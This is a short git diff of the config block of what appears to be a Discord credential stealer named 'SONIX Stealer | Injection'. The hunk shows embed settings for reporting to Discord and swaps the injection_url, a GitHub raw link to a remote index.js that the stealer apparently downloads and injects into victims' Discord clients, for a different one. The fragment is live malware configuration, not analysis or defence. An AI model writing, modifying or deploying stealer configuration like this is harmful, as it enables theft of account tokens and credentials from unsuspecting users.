@@ -14,7 +14,7 @@ const config = {
   embed_name: 'SONIX Stealer | Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1263416039899795557/1294993987198783529/download.jpg?'.replace(/ /g, '%20'), 
   embed_color: 0x812118, 
-  injection_url: 'https://github.com/SoulOnToq/Discord-Injection/raw/refs/heads/main/index.js', 
+  injection_url: 'https://github.com/Sx-Creator/Injection/raw/refs/heads/main/index.js', 
   /**
    
    **/
